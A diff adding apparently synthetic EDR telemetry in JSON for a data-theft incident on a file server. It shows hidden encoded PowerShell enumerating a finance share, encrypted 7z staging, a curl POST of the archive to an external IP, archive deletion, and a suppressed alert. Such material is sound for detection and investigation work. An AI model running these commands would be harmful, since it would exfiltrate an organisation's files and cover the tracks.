@@ -1,0 +1,17 @@
+{
+  "source": "CrowdStrike Falcon EDR",
+  "endpoint": "FILE-SRV-02",
+  "query_window": "2026-05-16T06:20:00Z to 2026-05-16T06:36:00Z",
+  "events": [
+    {"timestamp": "2026-05-16T06:23:08Z", "event": "smb_session_open", "user": "j.alvarez", "src_ip": "10.50.12.88", "process": "svchost.exe", "share": "Finance$"},
+    {"timestamp": "2026-05-16T06:25:12Z", "event": "process_create", "user": "j.alvarez", "parent": "explorer.exe", "process": "powershell.exe", "cmdline": "powershell.exe -nop -w hidden -enc JABwAD0AJwBcAFwARgBJAEwARQAtAFMAUgBWAC0AMAAyAFwARgBpAG4AYQBuAGMAZQAkACcAOwBHAGUAdAAtAEMAaABpAGwAZABJAHQAZQBtACAALQBQAGEAdABoACAAJABwACAALQBSAGUAYwB1AHIAcwBlAA==", "decoded_cmdline_note": "Get-ChildItem -Path \\\\FILE-SRV-02\\Finance$ -Recurse"},
+    {"timestamp": "2026-05-16T06:26:45Z", "event": "process_create", "user": "j.alvarez", "parent": "powershell.exe", "process": "7z.exe", "cmdline": "7z.exe a -p[REDACTED] -mhe=on C:\\Users\\j.alvarez\\AppData\\Local\\Temp\\fs_q2.7z \\\\FILE-SRV-02\\Finance$\\Quarterly\\*"},
+    {"timestamp": "2026-05-16T06:28:33Z", "event": "file_created", "user": "j.alvarez", "path": "C:\\Users\\j.alvarez\\AppData\\Local\\Temp\\fs_q2.7z", "size_bytes": 524288000, "hash_sha256": "9f4c8a2b1e7d3f5a6c8b9e0d1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a"},
+    {"timestamp": "2026-05-16T06:30:51Z", "event": "process_create", "user": "j.alvarez", "parent": "powershell.exe", "process": "curl.exe", "cmdline": "curl.exe -X POST -H \"Content-Type: application/octet-stream\" --data-binary @C:\\Users\\j.alvarez\\AppData\\Local\\Temp\\fs_q2.7z https://45.142.213.67/upload"},
+    {"timestamp": "2026-05-16T06:31:02Z", "event": "network_connect", "process": "curl.exe", "remote_ip": "45.142.213.67", "remote_port": 443, "protocol": "tcp"},
+    {"timestamp": "2026-05-16T06:34:35Z", "event": "file_delete", "user": "j.alvarez", "path": "C:\\Users\\j.alvarez\\AppData\\Local\\Temp\\fs_q2.7z", "note": "anti-forensics: archive deleted after exfil"}
+  ],
+  "edr_detections_suppressed": [
+    {"rule": "Encoded PowerShell with hidden window", "status": "alert raised but below SIEM correlation threshold", "rule_id": "CS-PWR-014"}
+  ]
+}
